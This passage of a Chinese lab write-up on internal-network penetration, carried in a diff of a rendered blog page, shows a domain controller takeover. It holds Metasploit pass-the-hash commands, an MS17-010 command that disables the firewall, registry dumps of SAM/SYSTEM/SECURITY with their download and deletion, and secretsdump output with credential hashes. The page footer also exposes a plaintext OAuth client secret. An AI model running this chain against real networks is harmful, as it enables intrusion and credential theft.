class="line">whoamianony.org\<span class="symbol">moretz:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="symbol">:</span><span class="number">6630108</span>d408ba8ee70eda87474753a21</span><br><span class="line">whoamianony.org\<span class="symbol">moretz:</span>des-cbc-<span class="symbol">md5:</span><span class="number">4</span>ca849cbda4089c7</span><br><span class="line"><span class="title class_">DC</span><span class="variable">$:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="symbol">:</span><span class="number">158</span>b91d51f464d4925203f858df685b6902071fa99d8548db9d949a396953a68</span><br><span class="line"><span class="title class_">DC</span><span class="variable">$:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="symbol">:</span><span class="number">23</span>cdac24d614d6dabbd7a3c66e4e2477</span><br><span class="line"><span class="title class_">DC</span><span class="variable">$:</span>des-cbc-<span class="symbol">md5:</span><span class="number">92</span>da0d348a19a73b</span><br><span class="line"><span class="title class_">PC2</span><span class="variable">$:</span>aes256-cts-hmac-sha1<span class="number">-96</span><span class="symbol">:</span><span class="number">38</span>cf43330eca30a0114358191d2de2f9994b428cf74107664c625809bc660ffd</span><br><span class="line"><span class="title class_">PC2</span><span class="variable">$:</span>aes128-cts-hmac-sha1<span class="number">-96</span><span class="symbol">:b88f8baef00436404acbb56a58119f36</span></span><br><span class="line"><span class="title class_">PC2</span><span class="variable">$:</span>des-cbc-<span class="symbol">md5:</span><span class="number">7</span>fec0da1d9f29457</span><br><span class="line">[*] <span class="title class_">Cleaning</span> up...</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241221014849841.png" alt="image-20241221014849841"></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">得到hash之后，使用MSF PSEXEC模块上线</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="keyword">set</span> SMBUser <span class="comment">administrator</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBPass aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">payload windows</span>/meterpreter/<span class="comment">bind_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">rhost 192.168.93.30</span></span><br><span class="line">run/exploit</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/psexec</span><br><span class="line">[*] <span class="keyword">No</span> payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">[*] New in Metasploit <span class="number">6.4</span> - This module can target a SESSION <span class="keyword">or</span> an RHOST</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="keyword">set</span> SMBUser <span class="comment">administrator</span></span><br><span class="line">SMBUser <span class="comment">=&gt; administrator</span></span><br><span class="line">msf6 <span class="comment">exploit(windows</span>/smb/<span class="comment">psexec) &gt; set SMBPass aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec</span></span><br><span class="line">SMBPass <span class="comment">=&gt; aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec</span></span><br><span class="line">msf6 <span class="comment">exploit(windows</span>/smb/<span class="comment">psexec) &gt; set payload windows</span>/meterpreter/<span class="comment">bind_tcp</span></span><br><span class="line">payload <span class="comment">=&gt; windows</span>/meterpreter/<span class="comment">bind_tcp</span></span><br><span class="line">msf6 <span class="comment">exploit(windows</span>/smb/<span class="comment">psexec) &gt; set rhost 192.168.93.30</span></span><br><span class="line">rhost <span class="comment">=&gt; 192.168.93.30</span></span><br><span class="line">msf6 <span class="comment">exploit(windows</span>/smb/<span class="comment">psexec) &gt; run</span></span><br><span class="line"></span><br><span class="line">[*] 192.168.93.30:445 - Connecting <span class="comment">to the server...</span></span><br><span class="line">[*] 192.168.93.30:445 - Authenticating <span class="comment">to 192.168.93.30:445 as user</span> <span class="comment">&#x27;administrator&#x27;</span><span class="comment">...</span></span><br><span class="line">[*] 192.168.93.30:445 - Selecting <span class="comment">PowerShell target</span></span><br><span class="line">[*] 192.168.93.30:445 - Executing <span class="comment">the payload...</span></span><br><span class="line">[+] 192.168.93.30:445 - Service <span class="comment">start timed out, OK if running a command or non-service executable...</span></span><br><span class="line">[*] Started <span class="comment">bind TCP handler against 192.168.93.30:4444</span></span><br><span class="line">[*] Exploit <span class="comment">completed, but no session was created.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">其实exp是成功了,但是没有session,是因为有防火墙,这里需要用ms17的命令执行来关闭防火墙,虽然ms17不能创建shell,但是是可以命令执行的</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; <span class="built_in">set</span> RHOSTS 192.168.93.30</span><br><span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; <span class="built_in">set</span> <span class="built_in">command</span> netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br><span class="line">msf6 auxiliary(admin/smb/ms17_010_command) &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241221015527624.png" alt="image-20241221015527624"></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="keyword">set</span> SMBUser <span class="comment">administrator</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBPass aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">payload windows</span>/meterpreter/<span class="comment">bind_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">rhost 192.168.93.30</span></span><br><span class="line">run/exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241221015618602.png" alt="image-20241221015618602"></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">成功拿到DC机的<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">恢复域控Hash,不然会导致脱域</span><br><span class="line">执行以下命令，获取目标原始hash</span><br><span class="line"></span><br><span class="line">使用msf进行生成</span><br><span class="line"></span><br><span class="line">reg <span class="built_in">save</span> HKLM\SYSTEM <span class="built_in">system</span>.<span class="built_in">save</span></span><br><span class="line">reg <span class="built_in">save</span> HKLM\SAM sam.<span class="built_in">save</span></span><br><span class="line">reg <span class="built_in">save</span> HKLM\SECURITY security.<span class="built_in">save</span></span><br><span class="line"></span><br><span class="line">回到msf,下载</span><br><span class="line">download c:\\<span class="built_in">system</span>.<span class="built_in">save</span> <span class="built_in">system</span>.<span class="built_in">save</span></span><br><span class="line">download C:\\sam.<span class="built_in">save</span> sam.<span class="built_in">save</span></span><br><span class="line">download c:\\security.<span class="built_in">save</span> security.<span class="built_in">save</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241221020322887.png" alt="image-20241221020322887"></p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">下载完成之后进行删除</span><br><span class="line"></span><br><span class="line"><span class="built_in">del</span> /f <span class="built_in">system</span>.<span class="built_in">save</span></span><br><span class="line"><span class="built_in">del</span> /f sam.<span class="built_in">save</span></span><br><span class="line"><span class="built_in">del</span> /f security.<span class="built_in">save</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看域控hash</span><br><span class="line">python3 secretsdump.py -sam sam.<span class="built_in">save</span> -<span class="built_in">system</span> <span class="built_in">system</span>.<span class="built_in">save</span> -security security.<span class="built_in">save</span> LOCAL</span><br><span class="line">faaa981d91cf963816852ac874bbbc70</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241221020534982.png" alt="image-20241221020534982"></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxychains</span> python3 reinstall_original_pw.py DC <span class="number">192.168.93.30</span> faaa981d91cf963816852ac874bbbc70</span><br><span class="line">用脚本恢复</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02//image-20241221020659624.png" alt="image-20241221020659624"></p>
+<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">今夜就到这里吧,<span class="number">2</span>点了.</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86/">内网渗透-Linux提权梳理</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
